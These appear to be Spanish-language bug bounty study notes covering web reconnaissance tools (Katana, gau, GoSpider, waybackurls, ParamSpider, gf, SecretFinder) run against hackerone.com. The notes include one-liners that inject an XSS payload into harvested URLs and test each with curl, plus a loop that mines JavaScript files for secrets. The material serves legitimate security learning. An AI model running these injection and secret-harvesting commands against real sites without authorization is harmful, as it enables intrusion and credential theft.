## [Katana](https://github.com/projectdiscovery/katana)

[Link Youtube](https://www.youtube.com/watch?v=iQctQx7PHos&ab_channel=BePractical)

Escanea la url en busca de links que se usan.

Instalación

```ruby
go install github.com/projectdiscovery/katana/cmd/katana@latest
mv ~/go/bin/katana /usr/local/bin
```

Forma de escanear una web traer todos los archivos

```ruby
katana -u https://hackerone.com -jc -o katana
```

Traer los archivos .js

```ruby
katana -u https://hackerone.com -jc | grep ".js$" | uniq | sort > katana_js.txt
```

## [Gau](https://github.com/lc/gau)

[Link Udemy](https://www.udemy.com/course/recon-for-bug-bounty-penetration-testers-ethical-hackers/learn/lecture/35453790#overview)

```ruby
sudo apt install gccgo-go
sudo apt-get install golang-go
go install github.com/lc/gau/v2/cmd/gau@latest
cd ~/go/bin
mv ~/go/bin/gau /usr/local/bin
```

Forma de usar el raspador de links

```ruby
sudo echo "hackerone.com" | gau > links_buscados.txt
```

Filtros

```ruby
cat links_buscados.txt | grep ? | tee hackerone_parameters.txt
cat links_buscados.txt | grep -E *[.]js | tee hackerone_parameters_js.txt
```

## [GoSpider](https://github.com/jaeles-project/gospider)

[Link Udemy](https://www.udemy.com/course/recon-for-bug-bounty-penetration-testers-ethical-hackers/learn/lecture/35453800#overview)

```ruby
sudo apt install gccgo-go
sudo apt-get install golang-go
GO111MODULE=on go install github.com/jaeles-project/gospider@latest
sudo mv ~/go/bin/gospider /usr/local/bin
```

Forma de usarlo

```ruby
gospider -w -s https://hackerone.com -o link_hackerone.txt
```

## [WaybackUrls](https://github.com/tomnomnom/waybackurls)

```ruby
sudo apt install gccgo-go
sudo apt-get install golang-go
go install github.com/tomnomnom/waybackurls@latest
sudo mv ~/go/bin/waybackurls /usr/local/bin
```

### [WayBack Burpsuite](https://www.udemy.com/course/recon-for-bug-bounty-pentesting-ethicalhacking-by-shifa-rohit-hacktify/learn/lecture/21762876#overview)

-> AQUI: busamos en el link lo siguiente: ?url=hackerone.com/  y procedemos a cambiarlo por la url que necesitemos buscar y la pegamos en el navegador.

```ruby
https://web.archive.org/web/timemap/json?url=hackerone.com/&fl=timestamp:4,original,urlkey&matchType=prefix&filter=statuscode:200&filter=mimetype:text/html&collapse=urlkey&collapse=timestamp:4&limit=100000
```

### [WayBack Automation](https://www.udemy.com/course/recon-for-bug-bounty-pentesting-ethicalhacking-by-shifa-rohit-hacktify/learn/lecture/21762880#overview)

[Link Udemy](https://www.udemy.com/course/recon-for-bug-bounty-pentesting-ethicalhacking-by-shifa-rohit-hacktify/learn/lecture/21762880#overview)

Es un script que lo hace de forma semi-manual
Buscamos url y le colocamos la palabra fuzz con el programa qsreplace.

```ruby
waybackurls hackerone.com | tee test_url.txt |  qsreplace '"><script>confirm(1)</script>' | tee  combinedfuzz.json  && cat combinedfuzz.json | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n";done
```

## [Paramspider](https://github.com/devanshbatham/ParamSpider)

Paramspiderle permite recuperar URL relacionadas con cualquier dominio o una lista de dominios de Wayback Achives. Filtra las URL "aburridas", lo que le permite centrarse en las que más importan.

[Link Udemy](https://www.udemy.com/course/recon-for-bug-bounty-pentesting-ethicalhacking-by-shifa-rohit-hacktify/learn/lecture/21762882#overview)

```ruby
git clone https://github.com/devanshbatham/paramspider
cd paramspider
pip install .
sudo mv /home/kali/.local/bin/paramspider /usr/local/bin
```

Forma de uso de la herramienta.
Se crea una carpeta con todos los datos de saldia.

### ACA!

```ruby
paramspider -d hackerone.com --placeholder FUZZ
```

```ruby
paramspider -d hackerone.com
cat results/hackerone.com.txt | tee yy.json | qsreplace '"><script>confirm(1)</script>' | while read host do; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n"; done
```
Estos resultados los obtuvimos con la herramienta Paramspider, la cual le coloca FUZZ a los parametros.\
Aqui procedemos a usar los diferentes parametros y crear archivos diferentes

```ruby
cat results/hackerone.com.txt | gf xss | tee xss_output.txt
```

### Una vez encontrada algunos links procedemos a inyectar payloads con la herramienta gf

## [gf](https://github.com/tomnomnom/gf)

[Link Udemy](https://www.udemy.com/course/recon-for-bug-bounty-penetration-testers-ethical-hackers/learn/lecture/35462246#overview)

```ruby
go install github.com/tomnomnom/gf@latest
sudo mv ~/go/bin/gf /usr/local/bin
mkdir ~/.gf
cp ~/go/pkg/mod/github.com/tomnomnom/gf@v0.0.0-20200618134122-dcd4c361f9f5/examples/* ~/.gf
git clone https://github.com/1ndianl33t/Gf-Patterns
mv ~/Gf-Patterns/*.json ~/.gf
```

# Buscador de Parametros

## [Secretfinder](https://github.com/m4ll0k/SecretFinder)

```ruby
git clone https://github.com/m4ll0k/SecretFinder.git secretfinder
cd secretfinder
python -m pip install -r requirements.txt | pip install -r requirements.txt
python3 SecretFinder.py
```

```ruby
cat katana_js.txt | while read url; do python3 /opt/secretfinder/SecretFinder.py -i $url -o cli >> secret.txt; done
```

## [Qsreplace](https://github.com/tomnomnom/qsreplace)























